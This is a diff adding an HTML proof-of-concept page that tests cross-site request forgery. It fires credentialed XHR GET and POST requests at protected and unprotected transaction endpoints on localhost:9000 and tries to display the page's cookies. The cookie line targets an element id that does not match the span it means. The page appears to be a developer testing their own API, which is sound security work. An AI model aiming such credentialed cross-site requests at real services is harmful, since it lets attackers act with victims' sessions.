@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <title>CSRF Proof of Concept</title>
+</head>
+
+<body>
+
+<noscript>Click <a href="http://localhost:9000/transactions/nosecret">here</a> and you should see <em>secret data</em>.
+</noscript>
+
+<h1>Protected API</h1>
+
+<p>XHR POST: <span id="ppost"></span></p>
+
+<p>XHR GET: <span id="pget"> </span></p>
+
+<h1>Unprotected API</h1>
+
+<p>XHR POST: <span id="upost"></span></p>
+
+<p>XHR GET: <span id="uget"></span></p>
+
+<h1>Cookies</h1>
+
+<p>Cookies: <span id="cookies"></span></p>
+
+<script>
+    //<![CDATA[
+    function api(method, url, id) {
+        var x = new XMLHttpRequest();
+        x.open(method, url, true);
+        x.withCredentials = true;
+        x._id = id;
+        x._method = method;
+        x._url = url;
+
+        x.onload = function(e) {
+          console.log('method=' + this._method + ' id=' + this._id + ' url=' + this._url);
+          if (this.status == 200) {
+             document.getElementById(this._id).innerText = x.responseText;
+          }
+        };
+
+        x.send();
+    }
+
+    // try unprotected APIs
+    api("GET","http://localhost:9000/transactions/nosecret", "uget");
+    api("POST","http://localhost:9000/transactions/nosecret", "upost");
+
+    // try protected APIs
+    api("GET","http://localhost:9000/transactions/secret", "pget");
+    api("POST","http://localhost:9000/transactions/secret", "ppost");
+
+    // list cookies available to this script
+    document.getElementById("cookie").innerText = document.cookie;
+    //]]>
+
+</script>
+
+
+</body>
+</html>
